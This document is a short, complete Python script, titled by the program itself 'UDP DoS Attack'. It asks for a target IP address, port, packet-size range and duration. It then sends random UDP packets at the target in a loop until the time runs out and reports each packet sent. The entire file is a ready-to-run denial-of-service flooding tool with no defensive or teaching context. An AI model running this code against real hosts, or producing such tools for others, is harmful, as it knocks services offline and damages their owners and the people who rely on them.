import os
import random
import socket
import time
os.system("title UDP DoS Attack")
os.system("cls")
print("UDP DoS")
ip = input("Target IP Address: ")
port = int(input("Target Port: "))
psmin = int(input("Packets min.: "))
psmax = int(input("Packets max.: "))
if (psmin > psmax):
    print("ERROR: min. packet size > max. packet size")
    input("Press any key to exit...")
    quit()
duration = int(input("Duration (in seconds): "))
if (duration <= 0):
    print("ERROR: duration <= 0\nPress any key to exit...")
    input("Press any key to exit...")
    quit()
timeout = time.time() + duration
sent = 0
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    if (time.time() > timeout):
        print("Attack Stopped")
        socket.close()
        input("Press any key to exit...")
        quit()
    else:
        randIntRange = random.randint(psmin, psmax)
        ps = bytes(random._urandom(randIntRange))
        socket.sendto(ps, (ip, port))
        sent += 1
        print("Sent %s packets with %s bytes each to %s through port %s" % (sent, randIntRange, ip, port))
